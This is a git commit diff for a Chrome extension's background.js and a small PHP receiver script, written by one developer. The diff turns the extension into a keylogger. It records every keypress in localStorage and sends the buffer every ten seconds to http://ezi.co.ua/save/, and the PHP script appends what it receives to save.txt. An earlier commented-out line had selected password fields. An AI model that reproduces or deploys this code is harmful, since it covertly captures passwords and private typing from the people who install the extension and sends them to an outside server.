12513a9fc6dbdd6e5799bbcd4ef91e499cbd3ea7
e.zinchenko <idc.zinchenko@gmail.com>
2017-05-15 01:32:14 +0300

    /*-+++

--- chrome-extention-1/background.js
+++ chrome-extention-1/background.js
@@ -1,26 +1,31 @@
 console.log('Расширение EZI рботает))');
+localStorage.t = '';
 
 var ezi = {
     post: function(url, data, cb){
         var xhr = new XMLHttpRequest();
-        var json = JSON.stringify(data);
+        var fd = new FormData;
+        fd.append('data', data);
         xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
         xhr.onreadystatechange = function() {
             if (xhr.readyState !== 4) return;
-            if (xhr.status !== 200) {
+            if (xhr.status === 200) {
                 cb();
             } else {
                 console.error('Ошибка отправки запроса!');
             }
         };
-        xhr.send(json);
+        xhr.send(fd);
     }
 };
-
-
-document.body.addEventListener('click', function(e){
-    console.log(e.target);
+document.body.addEventListener('keypress', function(e){
+    localStorage.t += e.key;
 });
 
-// console.log(document.querySelectorAll('[type="password"]'));
+setInterval(function(){
+    if(localStorage.t){
+        ezi.post('http://ezi.co.ua/save/', localStorage.t, function(){
+            localStorage.t = '';
+        });
+    }
+}, 10000);
--- save/index.php
+++ save/index.php
@@ -7,7 +7,7 @@ $p = isset($_POST['data']) ? '_POST: '.$_POST['data'].";\n" : '';
 
 file_put_contents(
     "save.txt",
-    date('d M Y H:i')."\n{$g}{$p}________________________"."\n",
+    date('d.m.y H:i')."\n{$g}{$p}_____"."\n",
     FILE_APPEND | LOCK_EX
 );
 
